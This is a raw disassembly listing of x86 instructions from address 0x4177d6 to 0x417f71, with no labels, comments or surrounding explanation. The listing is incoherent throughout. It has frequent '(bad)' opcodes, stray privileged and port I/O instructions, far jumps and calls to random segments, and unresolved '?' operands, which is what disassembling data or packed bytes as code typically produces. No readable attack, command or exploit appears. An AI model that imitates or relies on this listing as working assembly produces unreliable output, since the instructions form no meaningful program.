  4177d6:	ret    
  4177d7:	or     bl,dl
  4177d9:	loopne 0x4177e4
  4177db:	jg     0x41780b
  4177dd:	into   
  4177de:	(bad)  [ecx]
  4177e0:	cdq    
  4177e1:	cdq    
  4177e2:	push   edi
  4177e3:	cmp    BYTE PTR [eax],dh
  4177e5:	push   ebp
  4177e6:	add    eax,DWORD PTR [ebp-0x72]
  4177e9:	test   dh,bl
  4177eb:	or     DWORD PTR [eax-0x6ab0a50c],edx
  4177f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177f2:	ror    DWORD PTR [edx-0x62cc05e7],0x64
  4177f9:	mov    dl,0x3e
  4177fb:	push   edx
  4177fc:	add    edx,DWORD PTR [ebx-0x778d9353]
  417802:	out    dx,al
  417803:	pop    es
  417804:	scas   al,BYTE PTR es:[edi]
  417805:	int    0x5e
  417807:	sub    BYTE PTR [ecx+0x7d],dl
  41780a:	pop    esi
  41780b:	rcr    BYTE PTR [eax-0x297720fd],0xec
  417812:	imul   esp,DWORD PTR [esi+0x27398f5d],0xffffffec
  417819:	stos   BYTE PTR es:[edi],al
  41781a:	test   DWORD PTR [ebp+0x58efa938],esi
  417820:	retf   
  417821:	cmp    al,0x76
  417823:	inc    ebp
  417824:	pusha  
  417825:	inc    edi
  417826:	xchg   ebx,eax
  417827:	dec    eax
  417828:	push   edi
  417829:	daa    
  41782a:	outs   dx,BYTE PTR ds:[esi]
  41782b:	lock call 0xa2808116
  417831:	clc    
  417832:	int3   
  417833:	lea    edi,[ecx]
  417835:	cmp    ebp,eax
  417837:	push   esi
  417838:	jle    0x4177ca
  41783a:	fbstp  TBYTE PTR ds:0xcdf60a0
  417840:	aam    0xfe
  417842:	or     eax,0x8b7c0cbe
  417847:	fsubr  QWORD PTR [ebx+0x629f807c]
  41784d:	ror    DWORD PTR [eax+0x42dd4323],cl
  417853:	jnp    0x417848
  417855:	inc    edi
  417856:	or     al,0x98
  417858:	mov    gs,WORD PTR [edi-0x62]
  41785b:	aad    0xfb
  41785d:	jnp    0x417837
  41785f:	xchg   edx,esp
  417861:	sub    al,0x77
  417863:	mov    al,ds:0xde297d2e
  417868:	scas   al,BYTE PTR es:[edi]
  417869:	and    eax,DWORD PTR [eax+0x28be80ba]
  41786f:	dec    ecx
  417870:	mov    cl,0x3a
  417872:	leave  
  417873:	mov    cl,0x83
  417875:	or     BYTE PTR [ebp+0x3341822e],ah
  41787b:	mov    al,dh
  41787d:	or     dl,BYTE PTR [ebx]
  41787f:	pop    eax
  417880:	jnp    0x417859
  417882:	adc    esp,edx
  417884:	adc    al,0x40
  417886:	call   0x92153b29
  41788b:	rol    DWORD PTR [ebp+edi*1-0x34],0x9f
  417890:	dec    ebp
  417891:	das    
  417892:	(bad)  
  417893:	mov    cl,0x8e
  417895:	dec    ebp
  417896:	mov    ah,0x1b
  417898:	fscale 
  41789a:	mov    WORD PTR [edx],fs
  41789c:	push   ebp
  41789d:	mov    eax,0xc8c0d77a
  4178a2:	jp     0x417857
  4178a4:	xchg   bh,bh
  4178a6:	inc    esp
  4178a7:	push   edx
  4178a8:	(bad)  
  4178aa:	jge    0x41789d
  4178ac:	adc    eax,0xd3cebeb1
  4178b1:	mov    bh,0xed
  4178b3:	jns    0x41784f
  4178b5:	add    DWORD PTR [ebp-0x2],edi
  4178b8:	test   eax,0x5c0d729c
  4178bd:	push   0x4d6b211e
  4178c2:	xchg   DWORD PTR [eax-0x30d3e2fb],esp
  4178c8:	push   ds
  4178c9:	rcl    esi,1
  4178cb:	arpl   WORD PTR [esi-0x14e4ee1b],di
  4178d1:	leave  
  4178d2:	int3   
  4178d3:	xchg   edx,eax
  4178d4:	push   ebp
  4178d5:	sbb    cl,BYTE PTR [edx+0xbd12929]
  4178db:	stc    
  4178dc:	and    DWORD PTR [eax-0x25a14c8f],edi
  4178e2:	outs   dx,DWORD PTR ds:[esi]
  4178e3:	test   BYTE PTR [ebx],bl
  4178e5:	repz jle 0x4178bd
  4178e8:	popa   
  4178e9:	push   ds
  4178ea:	adc    ch,0x7c
  4178ed:	bound  eax,QWORD PTR [edi-0x58]
  4178f0:	push   ss
  4178f1:	scas   al,BYTE PTR es:[edi]
  4178f2:	mov    eax,ds:0x41c62b71
  4178f7:	fsub   st(7),st
  4178f9:	inc    esi
  4178fa:	fsubr  st,st(7)
  4178fd:	xchg   esi,eax
  4178fe:	sti    
  4178ff:	lea    eax,[eax]
  417901:	cld    
  417902:	jo     0x41794c
  417904:	cld    
  417905:	jnp    0x417897
  417907:	pushf  
  417908:	or     ah,dl
  41790a:	sub    al,0x36
  41790c:	in     eax,dx
  41790d:	lds    ecx,FWORD PTR [edx+edi*1]
  417910:	inc    edi
  417911:	xchg   ebp,eax
  417912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417913:	inc    ecx
  417914:	fisttp WORD PTR [eax-0x4a]
  417917:	jg     0x41790f
  417919:	je     0x4178b7
  41791b:	xor    ebx,ebp
  41791d:	pop    ecx
  41791e:	(bad)  
  41791f:	mov    esi,0x95682030
  417924:	ror    DWORD PTR [esi+ebp*8],0x0
  417928:	retf   
  417929:	cmp    dl,BYTE PTR [ebx+edx*1]
  41792c:	mov    ebx,0x3ee4c71f
  417931:	imul   esp,DWORD PTR [ebx+0x60],0xb34a3b7
  417938:	push   ss
  417939:	lahf   
  41793a:	mov    ?,eax
  41793c:	test   DWORD PTR [ebp+0x5e],esi
  41793f:	nop    edi
  417942:	dec    eax
  417943:	add    dl,BYTE PTR [edx+0x34ba983c]
  417949:	jnp    0x41794b
  41794b:	clc    
  41794c:	inc    edi
  41794d:	test   eax,0x62df2ede
  417952:	fstp   QWORD PTR [ecx-0x72]
  417955:	shl    edi,0x6c
  417958:	into   
  417959:	pop    edi
  41795a:	dec    ecx
  41795b:	imul   ebp,DWORD PTR [ebp+0x5e8b4618],0xa60a26
  417965:	outs   dx,DWORD PTR ds:[esi]
  417966:	inc    ecx
  417967:	shr    DWORD PTR [edi+0x51b84cdc],cl
  41796d:	imul   edx
  41796f:	repnz outs dx,DWORD PTR ds:[esi]
  417971:	mov    eax,0x4837e584
  417976:	or     eax,0xc87e4b43
  41797b:	sub    ch,BYTE PTR [esi-0x48]
  41797e:	mov    cl,0xa6
  417980:	xchg   BYTE PTR [ecx*1+0x6a11f29d],ah
  417987:	sbb    al,0x7a
  417989:	loop   0x417982
  41798b:	push   ebp
  41798c:	enter  0x4458,0x98
  417990:	jge    0x417950
  417992:	mov    bh,0xe7
  417994:	pop    ss
  417995:	pop    edi
  417996:	int    0x23
  417998:	shr    DWORD PTR [edx+0x510d8ff3],1
  41799e:	mov    ebx,eax
  4179a0:	or     bh,ah
  4179a2:	and    al,0x35
  4179a4:	xor    bh,BYTE PTR [edi+0x27]
  4179a7:	sbb    eax,0x2e0b8eae
  4179ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179ad:	mov    edx,0x4bff3417
  4179b2:	pop    es
  4179b3:	push   cs
  4179b4:	outs   dx,BYTE PTR ds:[esi]
  4179b5:	(bad)  
  4179b6:	fstp   st(7)
  4179b8:	fstp   st(5)
  4179ba:	out    0xb9,eax
  4179bc:	cmp    BYTE PTR [ecx],0x81
  4179bf:	pusha  
  4179c0:	xchg   ebx,eax
  4179c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179c2:	cmp    al,0xd2
  4179c4:	loop   0x417a31
  4179c6:	sbb    bh,BYTE PTR [eax+0x179cf5ea]
  4179cc:	ins    DWORD PTR es:[edi],dx
  4179cd:	xchg   esp,eax
  4179ce:	jge    0x41795b
  4179d0:	adc    eax,0x473eba9
  4179d5:	sub    eax,0xe8bd74b3
  4179da:	push   edx
  4179db:	jae    0x417a4c
  4179dd:	adc    al,ch
  4179df:	xchg   esp,eax
  4179e0:	or     BYTE PTR [ebp+0x4603948d],cl
  4179e6:	test   BYTE PTR [eax+0x3e904bc],0xb4
  4179ed:	sbb    DWORD PTR [ebx-0x61],0xa51d2ffb
  4179f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f5:	xlat   BYTE PTR ds:[ebx]
  4179f7:	ret    
  4179f8:	or     al,BYTE PTR [ecx]
  4179fa:	cmp    eax,0xf8e19ba4
  4179ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a00:	ins    DWORD PTR es:[edi],dx
  417a01:	xchg   edx,eax
  417a02:	sbb    eax,ebp
  417a04:	std    
  417a05:	pop    ecx
  417a06:	out    0x3c,al
  417a08:	pop    edx
  417a09:	mov    bh,0x2d
  417a0b:	xor    eax,0x57e60202
  417a10:	mov    WORD PTR [esi+ecx*4],ds
  417a13:	dec    esi
  417a14:	jp     0x417a47
  417a16:	mov    esi,0x7feb6f89
  417a1b:	push   ecx
  417a1c:	mov    esi,DWORD PTR [edi+0x1b]
  417a1f:	ficom  DWORD PTR [edx+edx*1+0x1ad66349]
  417a26:	jo     0x4179ce
  417a28:	popf   
  417a29:	hlt    
  417a2a:	sbb    al,0x54
  417a2c:	inc    ebx
  417a2d:	stos   DWORD PTR es:[edi],eax
  417a2e:	mov    ds:0x766aa73e,eax
  417a33:	out    0x91,eax
  417a35:	jp     0x417ab6
  417a37:	sub    al,0x3a
  417a39:	imul   BYTE PTR [esi]
  417a3b:	dec    esp
  417a3c:	pcmpeqw mm4,QWORD PTR ds:0x11e41e86
  417a43:	sbb    BYTE PTR [ebx],dl
  417a45:	pop    ds
  417a46:	mov    WORD PTR [esi+ebx*8],es
  417a49:	lods   al,BYTE PTR ds:[esi]
  417a4a:	mov    ?,WORD PTR [eax-0x7c]
  417a4d:	inc    esp
  417a4e:	pop    DWORD PTR [esi-0x3d287138]
  417a54:	jle    0x417a6c
  417a56:	(bad)  [ecx]
  417a58:	fist   DWORD PTR [eax-0x1becada]
  417a5e:	and    BYTE PTR [esi+ebp*8+0x6ba9cc8b],al
  417a65:	xchg   esi,eax
  417a66:	mov    cl,0x96
  417a68:	das    
  417a69:	inc    edx
  417a6a:	mov    ds,WORD PTR [ebx+0x5b]
  417a6d:	(bad)  
  417a6f:	mov    ds:0xdd34ddd0,eax
  417a74:	jle    0x417ae0
  417a76:	xlat   BYTE PTR ds:[ebx]
  417a77:	imul   ecx,DWORD PTR [ebp-0x67494ed8],0x38
  417a7e:	mov    eax,ds:0x7496a1c3
  417a83:	in     al,0x7c
  417a85:	hlt    
  417a86:	mov    ebx,0x22a1c6a2
  417a8b:	retf   
  417a8c:	daa    
  417a8d:	retf   0xf7fb
  417a90:	cmp    eax,0xdd592924
  417a95:	mov    BYTE PTR [ebx-0x3e],bh
  417a98:	je     0x417ab3
  417a9a:	dec    eax
  417a9b:	daa    
  417a9c:	sbb    dl,BYTE PTR [esi]
  417a9e:	jge    0x417a37
  417aa0:	pop    ds
  417aa1:	leave  
  417aa2:	jmp    0xaacf:0x60cb0c81
  417aa9:	jmp    0x13e6:0xfcefbae6
  417ab0:	xor    BYTE PTR [edx-0x5e],0xb1
  417ab4:	cmp    DWORD PTR [esi+0x1a868e48],esi
  417aba:	add    esp,DWORD PTR [ecx+0xdf0f482]
  417ac0:	ins    DWORD PTR es:[edi],dx
  417ac1:	mov    ebx,0x8ad1facc
  417ac6:	dec    ebp
  417ac7:	inc    ebp
  417ac8:	hlt    
  417ac9:	or     BYTE PTR [ebx-0x78bf8625],0x43
  417ad0:	jo     0x417ac5
  417ad2:	jl     0x417abc
  417ad4:	mov    esp,0x9369a42d
  417ad9:	cmp    al,0xdd
  417adb:	mov    esp,0x721d0d00
  417ae0:	dec    ecx
  417ae1:	cmp    bl,0x3a
  417ae4:	mov    edi,0xab23007d
  417ae9:	mov    dl,0xf9
  417aeb:	es aad 0xbf
  417aee:	shl    DWORD PTR [ecx],cl
  417af0:	push   0xffffff8d
  417af2:	loop   0x417ad9
  417af4:	or     edx,esi
  417af6:	ret    
  417af7:	xchg   esi,eax
  417af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417af9:	lods   al,BYTE PTR ds:[esi]
  417afa:	xor    BYTE PTR [eax-0x656d4b0d],dl
  417b00:	adc    DWORD PTR [esi-0x32],esi
  417b03:	aad    0x48
  417b05:	scas   al,BYTE PTR es:[edi]
  417b06:	jmp    0x417a8c
  417b08:	dec    edx
  417b09:	xor    edi,DWORD PTR [esp+edx*2+0x2d]
  417b0d:	mov    edi,0xe8e219dc
  417b12:	add    DWORD PTR [ecx],ebx
  417b14:	and    eax,0xdc01706f
  417b19:	scas   eax,DWORD PTR es:[edi]
  417b1a:	mov    dl,0xbc
  417b1c:	test   DWORD PTR [eax+eiz*1+0x18],ebp
  417b20:	mov    ds:0xa9461168,eax
  417b25:	fldcw  WORD PTR [esi]
  417b27:	jno    0x417b27
  417b29:	xchg   BYTE PTR [eax+0x2a11f4b2],ah
  417b2f:	stos   DWORD PTR es:[edi],eax
  417b30:	mov    ?,WORD PTR [edi-0x5]
  417b33:	push   eax
  417b34:	add    BYTE PTR [ebx],dl
  417b36:	and    al,0xd9
  417b38:	jbe    0x417b6d
  417b3a:	cmp    al,0xa9
  417b3c:	sbb    al,0x93
  417b3e:	mov    bl,0x8b
  417b40:	cld    
  417b41:	mov    DWORD PTR [ebp+0x51],ebx
  417b44:	fcomip st,st(6)
  417b46:	retf   0x6d40
  417b49:	stc    
  417b4a:	call   0x9879469d
  417b4f:	lods   al,BYTE PTR ds:[esi]
  417b50:	fisttp QWORD PTR [ecx+0x7a203205]
  417b56:	gs data16 data16 cld 
  417b5a:	and    BYTE PTR [edx+0x4b6da857],ah
  417b60:	sbb    eax,0xf593e302
  417b65:	scas   eax,DWORD PTR es:[edi]
  417b66:	xchg   ecx,eax
  417b67:	or     DWORD PTR ds:0xbf7073e9,ecx
  417b6d:	cld    
  417b6e:	aaa    
  417b6f:	xor    BYTE PTR [ecx],dh
  417b71:	int3   
  417b72:	adc    BYTE PTR [eax-0x50],dl
  417b75:	iret   
  417b76:	int3   
  417b77:	jbe    0x417b22
  417b79:	rsm    
  417b7b:	xlat   BYTE PTR ds:[ebx]
  417b7c:	add    ebx,esi
  417b7e:	push   eax
  417b7f:	iret   
  417b80:	inc    esp
  417b81:	lea    ebx,[ebx+0x48]
  417b84:	and    BYTE PTR [esi-0x2358bb41],bh
  417b8a:	mov    eax,cr7
  417b8d:	mov    al,0x91
  417b8f:	in     eax,0xa1
  417b91:	enter  0xcca9,0xce
  417b95:	stc    
  417b96:	adc    esi,ebx
  417b98:	es scas eax,DWORD PTR es:[edi]
  417b9a:	mov    edx,0x5c26806f
  417b9f:	push   0x37
  417ba1:	jp     0x417c0d
  417ba3:	ds push edi
  417ba5:	aas    
  417ba6:	call   0x7943:0x2c539128
  417bad:	mov    esi,DWORD PTR [eax+0x8]
  417bb0:	cli    
  417bb1:	adc    bh,cl
  417bb3:	jbe    0x417c0d
  417bb5:	jmp    0x4c35:0x35ab8bb7
  417bbc:	fmul   QWORD PTR [edi+edx*1-0x23]
  417bc0:	mov    ecx,0xbe5fbd7c
  417bc5:	jne    0x417c37
  417bc7:	(bad)  
  417bc8:	adc    DWORD PTR [edi-0xb],esi
  417bcb:	inc    esi
  417bcc:	mov    ah,0xf6
  417bce:	pushf  
  417bcf:	in     eax,0x76
  417bd1:	sbb    BYTE PTR [ebx-0xb],dh
  417bd4:	aam    0x17
  417bd6:	xor    ebp,ebx
  417bd8:	xchg   ecx,eax
  417bd9:	add    eax,0x5421ac42
  417bde:	retf   
  417bdf:	mov    BYTE PTR [edi+0x109dad06],bl
  417be5:	loopne 0x417c15
  417be7:	dec    edi
  417be8:	retf   0x8276
  417beb:	ins    DWORD PTR es:[edi],dx
  417bec:	mov    eax,cs
  417bee:	int3   
  417bef:	stos   BYTE PTR es:[edi],al
  417bf0:	js     0x417bce
  417bf2:	xor    dl,al
  417bf4:	iret   
  417bf5:	call   ebx
  417bf7:	mov    eax,ds:0xb2264502
  417bfc:	mov    ebp,0xd37844dc
  417c01:	jle    0x417bdd
  417c03:	add    ch,BYTE PTR [edi-0x5b6c842a]
  417c09:	aam    0x1
  417c0b:	ret    0xc05a
  417c0e:	int    0x3
  417c10:	les    ecx,FWORD PTR [edx]
  417c12:	add    DWORD PTR [esi-0x2bd1209b],0xffffff96
  417c19:	push   ss
  417c1a:	push   0xffffff87
  417c1c:	dec    esp
  417c1d:	or     BYTE PTR [ebp-0x71],al
  417c20:	mov    dh,0x8e
  417c22:	mov    dl,BYTE PTR [esi+eiz*1-0x5]
  417c26:	test   BYTE PTR [edx+0x17],bl
  417c29:	xchg   esi,eax
  417c2a:	mov    esi,0x2a781c12
  417c2f:	pop    ebp
  417c30:	jge    0x417c23
  417c32:	or     al,0xf
  417c34:	inc    esp
  417c35:	mov    gs,WORD PTR [esi+0x3c4666f6]
  417c3b:	push   esp
  417c3c:	jmp    0x417c94
  417c3e:	dec    ecx
  417c3f:	inc    ebx
  417c40:	push   edi
  417c41:	imul   ebx,DWORD PTR [esi-0x3],0x6cbf2bc9
  417c48:	jge    0x417c29
  417c4a:	adc    esp,DWORD PTR [edx-0x26]
  417c4d:	test   edi,edi
  417c4f:	sub    al,bl
  417c51:	pop    ebx
  417c52:	js     0x417ccd
  417c54:	inc    edi
  417c55:	pusha  
  417c56:	cmp    BYTE PTR [eax+0x5f],ah
  417c59:	and    edx,DWORD PTR [esi]
  417c5b:	in     eax,dx
  417c5c:	test   DWORD PTR [esi+ebx*2-0x78],ebp
  417c60:	shl    BYTE PTR [ecx-0x644e05a3],1
  417c66:	(bad)  
  417c67:	fadd   QWORD PTR [edx+0x32d49d43]
  417c6d:	fcmovnb st,st(1)
  417c6f:	lds    bx,DWORD PTR [ecx-0x7ac87960]
  417c76:	fdivr  DWORD PTR [ecx-0x1f1fd86a]
  417c7c:	imul   edx,DWORD PTR [ecx],0x1123afb5
  417c82:	int    0x8
  417c84:	xor    BYTE PTR [edi+eax*2],0xe0
  417c88:	ret    0xe8d0
  417c8b:	leave  
  417c8c:	jb     0x417ca1
  417c8e:	adc    al,0xfd
  417c90:	inc    eax
  417c91:	imul   eax,DWORD PTR [ebp+0x7],0xffffffc6
  417c95:	add    esi,DWORD PTR [eax-0x616ca82e]
  417c9b:	sahf   
  417c9c:	pop    ebx
  417c9d:	xchg   esi,eax
  417c9e:	out    0xed,eax
  417ca0:	fstp   DWORD PTR [esi+0x182683a2]
  417ca6:	fabs   
  417ca8:	fld    st(1)
  417caa:	jo     0x417c38
  417cac:	push   eax
  417cad:	adc    DWORD PTR es:[edx+0x28],esi
  417cb1:	mov    ch,0x96
  417cb3:	add    al,BYTE PTR [edi-0x2b]
  417cb6:	fdivr  DWORD PTR [eax+0x14861243]
  417cbc:	addr16 je 0x417cd5
  417cbf:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cc1:	(bad)  
  417cc2:	ins    BYTE PTR es:[edi],dx
  417cc3:	jbe    0x417c55
  417cc5:	(bad)  
  417cc6:	gs rcr ch,1
  417cc9:	or     al,0x2b
  417ccb:	xchg   esi,eax
  417ccc:	jle    0xbfedf763
  417cd2:	inc    ebx
  417cd3:	ja     0x417ca8
  417cd5:	fstp   QWORD PTR ds:0x37b4ad92
  417cdb:	sub    al,0x32
  417cdd:	sub    al,0x55
  417cdf:	dec    BYTE PTR [ebx]
  417ce1:	xchg   edx,eax
  417ce2:	rcl    DWORD PTR [ebp+0x2940f85d],cl
  417ce8:	push   0x25
  417cea:	cwde   
  417ceb:	into   
  417cec:	ret    
  417ced:	jecxz  0x417cfb
  417cef:	dec    ecx
  417cf0:	adc    eax,0xa91e9541
  417cf5:	loopne 0x417cdd
  417cf7:	mov    ds:0x1ae3b587,eax
  417cfc:	push   esi
  417cfd:	dec    ebx
  417cfe:	dec    ebx
  417cff:	jle    0x417d09
  417d01:	push   ss
  417d02:	add    al,0x93
  417d04:	xor    eax,0x85a52abf
  417d09:	jno    0x417d36
  417d0b:	adc    ch,BYTE PTR [edx-0x44]
  417d0e:	stos   BYTE PTR es:[edi],al
  417d0f:	add    eax,0xdb7ff7f0
  417d14:	mov    eax,0x2edf4029
  417d19:	aaa    
  417d1a:	fcomp  DWORD PTR [eax+0x77]
  417d1d:	fs out dx,eax
  417d1f:	std    
  417d20:	xchg   eax,esi
  417d22:	mov    eax,0x872b4347
  417d27:	(bad)  
  417d28:	aad    0x2d
  417d2a:	test   al,0xcf
  417d2c:	mov    dl,0xc7
  417d2e:	mov    eax,0x4be52ab6
  417d33:	test   eax,0x5f7e3fa5
  417d38:	mov    cl,0xd5
  417d3a:	sbb    bl,bh
  417d3c:	add    edi,esp
  417d3e:	test   BYTE PTR [edi-0x33],al
  417d41:	rcl    DWORD PTR [esi],cl
  417d43:	test   eax,0x944473c8
  417d48:	daa    
  417d49:	inc    ebp
  417d4a:	dec    esp
  417d4b:	cmp    BYTE PTR [esi-0x27ab1527],dl
  417d51:	cmp    eax,0xbc0edb5c
  417d56:	mov    bh,0xd8
  417d58:	iret   
  417d59:	dec    esi
  417d5a:	add    al,0xc5
  417d5c:	sub    BYTE PTR [ebp-0x182d1ade],ah
  417d62:	sbb    eax,0xbd746f75
  417d67:	dec    edi
  417d68:	mov    dl,0xf9
  417d6a:	push   edi
  417d6b:	mov    esp,0xc8b99569
  417d70:	in     al,dx
  417d71:	xchg   BYTE PTR [ebx-0x6f],al
  417d74:	sbb    al,0x3f
  417d76:	fdivr  QWORD PTR [edx+ecx*8+0xa]
  417d7a:	fsubr  DWORD PTR [eax]
  417d7c:	push   ecx
  417d7d:	aaa    
  417d7e:	lds    eax,FWORD PTR [ebx-0x7f]
  417d81:	sub    eax,0x47cf6694
  417d86:	jne    0x417dba
  417d88:	cmp    DWORD PTR [eax],esp
  417d8a:	in     al,0x54
  417d8c:	push   es
  417d8d:	sub    al,0xce
  417d8f:	in     eax,dx
  417d90:	js     0x417d42
  417d92:	mov    BYTE PTR [ecx+ebx*1+0x2],dh
  417d96:	sub    BYTE PTR [edi+0x3b],bl
  417d99:	call   0x6e47:0x6e62a3a0
  417da0:	sbb    BYTE PTR [edi-0x40],cl
  417da3:	sub    al,0x8a
  417da5:	sbb    ecx,DWORD PTR [esi-0x3a]
  417da8:	loope  0x417e14
  417daa:	or     al,BYTE PTR [esi+0x42]
  417dad:	mov    edi,0x13a35a2e
  417db2:	sub    esi,DWORD PTR [esi]
  417db4:	cmc    
  417db5:	jne    0x417d77
  417db7:	adc    ch,bl
  417db9:	int3   
  417dba:	mov    dl,0x2e
  417dbc:	xchg   ebx,eax
  417dbd:	outs   dx,BYTE PTR ds:[esi]
  417dbe:	sbb    eax,0x3c657020
  417dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dc4:	lahf   
  417dc5:	ins    DWORD PTR es:[edi],dx
  417dc6:	or     eax,0xb7e51ecf
  417dcb:	jge    0x417e2c
  417dcd:	adc    dl,BYTE PTR [esi+0x51]
  417dd0:	inc    ebx
  417dd1:	add    al,0x5
  417dd3:	ss mov ss:0x269aa1f3,eax
  417dda:	xor    DWORD PTR [edx+0xf789f8c],esi
  417de0:	sbb    al,BYTE PTR gs:[ebp+eiz*1+0x7429f60e]
  417de8:	mov    dl,0x5c
  417dea:	(bad)  
  417deb:	dec    edi
  417dec:	enter  0xce54,0x3e
  417df0:	jns    0x417dad
  417df2:	mov    ah,0x5f
  417df4:	leave  
  417df5:	sub    edi,DWORD PTR [edx]
  417df7:	(bad)  
  417df8:	jne    0x417d91
  417dfa:	arpl   WORD PTR [edx],ax
  417dfc:	inc    edi
  417dfd:	mov    eax,0xc37a46b0
  417e02:	pop    esp
  417e03:	outs   dx,DWORD PTR ds:[esi]
  417e04:	ret    0xfd20
  417e07:	ret    0xca22
  417e0a:	out    dx,eax
  417e0b:	push   edi
  417e0c:	enter  0x4605,0x8a
  417e10:	hlt    
  417e11:	add    BYTE PTR [eax-0x3b],ch
  417e14:	jb     0x417e3e
  417e16:	lahf   
  417e17:	and    DWORD PTR [ecx+0x47],0xded9ae3b
  417e1e:	test   ebp,esp
  417e20:	arpl   WORD PTR [esi-0x1b],bp
  417e23:	add    edx,0xe768086
  417e29:	in     al,dx
  417e2a:	pop    edi
  417e2b:	inc    esi
  417e2c:	je     0x417dfa
  417e2e:	jecxz  0x417e16
  417e30:	pop    ds
  417e31:	imul   ebx,DWORD PTR [edi],0xffffffd7
  417e34:	imul   edi,DWORD PTR [esi],0x7
  417e37:	push   ecx
  417e38:	and    eax,0xde605fa3
  417e3d:	retf   
  417e3e:	stc    
  417e3f:	icebp  
  417e40:	(bad)  
  417e41:	sbb    BYTE PTR [ecx+0x51b1f3d7],ch
  417e47:	iret   
  417e48:	js     0x417e82
  417e4a:	xor    DWORD PTR [edx-0x16],eax
  417e4d:	stos   DWORD PTR es:[edi],eax
  417e4e:	test   ch,dl
  417e50:	out    0xa9,eax
  417e52:	cmp    BYTE PTR [eax+0x55],ch
  417e55:	sub    DWORD PTR [eax-0x7e],0xffffffcd
  417e59:	sub    edi,ecx
  417e5b:	repnz xor al,0x58
  417e5e:	cs push ebp
  417e60:	xor    DWORD PTR [eax],esi
  417e62:	in     al,dx
  417e63:	(bad)  
  417e64:	stc    
  417e65:	and    DWORD PTR [edi],ecx
  417e67:	aam    0xa4
  417e69:	pop    edx
  417e6a:	mov    ds:0x56939226,al
  417e6f:	test   al,0x69
  417e71:	pop    eax
  417e72:	and    bl,bh
  417e74:	(bad)
  417e79:	or     BYTE PTR [ecx+0xc453185],bh
  417e7f:	pop    ds
  417e80:	dec    ebx
  417e81:	xchg   edi,eax
  417e82:	inc    ecx
  417e83:	push   ds
  417e84:	pop    esi
  417e85:	sub    dh,cl
  417e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e88:	stos   DWORD PTR es:[edi],eax
  417e89:	outs   dx,DWORD PTR ds:[esi]
  417e8a:	into   
  417e8b:	fnsave [ebx]
  417e8d:	cmp    cl,al
  417e8f:	adc    esi,DWORD PTR [eax-0x1c1d5e20]
  417e95:	bnd call 0x9ef6cfa5
  417e9b:	jmp    DWORD PTR [edx-0x1a422b15]
  417ea1:	sar    DWORD PTR [ebx],1
  417ea3:	adc    DWORD PTR [eax],edi
  417ea5:	dec    esi
  417ea6:	stos   BYTE PTR es:[edi],al
  417ea7:	inc    esi
  417ea8:	push   ecx
  417ea9:	ds in  al,dx
  417eab:	popa   
  417eac:	shl    esp,cl
  417eae:	imul   edx,ecx,0x7d
  417eb1:	add    DWORD PTR [ebx-0x617e919e],ebx
  417eb7:	or     ah,BYTE PTR [ebx]
  417eb9:	sub    eax,edx
  417ebb:	add    BYTE PTR [ebp+0x2d],cl
  417ebe:	add    ebx,DWORD PTR [ebx]
  417ec0:	ins    BYTE PTR es:[edi],dx
  417ec1:	mov    ss:0x7120c34d,eax
  417ec7:	jnp    0x417f02
  417ec9:	daa    
  417eca:	(bad)  
  417ecb:	call   0x599ad6f1
  417ed0:	mul    BYTE PTR [esi]
  417ed2:	jnp    0x417efe
  417ed4:	dec    ebp
  417ed5:	dec    edx
  417ed6:	xchg   edx,eax
  417ed7:	adc    BYTE PTR [eax],al
  417ed9:	hlt    
  417eda:	test   BYTE PTR [ebx],bh
  417edc:	lea    ebp,[edx-0x3f]
  417edf:	cs das 
  417ee1:	cli    
  417ee2:	imul   edx,DWORD PTR [ebx+0x710d1b21],0xa3e4033d
  417eec:	lods   al,BYTE PTR ds:[esi]
  417eed:	loopne 0x417ee0
  417eef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ef0:	mov    esi,edi
  417ef2:	pusha  
  417ef3:	stc    
  417ef4:	mov    ah,0xbe
  417ef6:	in     eax,0x80
  417ef8:	push   ds
  417ef9:	sahf   
  417efa:	jmp    0x417f7b
  417efc:	in     al,0x34
  417efe:	sub    eax,0x2ba36422
  417f03:	je     0x417eaf
  417f05:	scas   eax,DWORD PTR es:[edi]
  417f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f07:	test   bh,bh
  417f09:	out    dx,eax
  417f0a:	xor    DWORD PTR [ebx-0x15684ac],esi
  417f10:	push   esp
  417f11:	sbb    eax,0x88a488c2
  417f16:	sub    cl,BYTE PTR [eax]
  417f18:	jno    0x417eb2
  417f1a:	(bad)
  417f1e:	test   esp,edx
  417f20:	xlat   BYTE PTR ds:[ebx]
  417f21:	test   cl,bh
  417f23:	ror    DWORD PTR [edi-0xd],cl
  417f26:	sub    ecx,DWORD PTR [ebp+0x6dea390c]
  417f2c:	xchg   ebp,eax
  417f2d:	in     al,0x52
  417f2f:	inc    eax
  417f30:	(bad)  
  417f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f32:	xor    BYTE PTR [ecx+0x976f3d6],dh
  417f38:	mov    ds:0x64b0515b,al
  417f3d:	fisttp WORD PTR [ecx+0x78cb147b]
  417f43:	xrelease mov BYTE PTR [ebx],bh
  417f46:	mov    WORD PTR [esi+0x1a49db8d],?
  417f4c:	gs cwde 
  417f4e:	fnstsw WORD PTR [edx]
  417f50:	dec    eax
  417f51:	pop    eax
  417f52:	das    
  417f53:	fistp  WORD PTR [edx]
  417f55:	jnp    0x417f15
  417f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f58:	imul   edi,DWORD PTR [ebx+0x299c8ed3],0x56
  417f5f:	mov    ebp,0x4904ae78
  417f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f66:	or     eax,DWORD PTR [eax-0x6c]
  417f69:	dec    esi
  417f6a:	int3   
  417f6b:	loop   0x417eee
  417f6d:	test   al,0x16
  417f6f:	sub    edi,ebx
  417f71:	cwde   
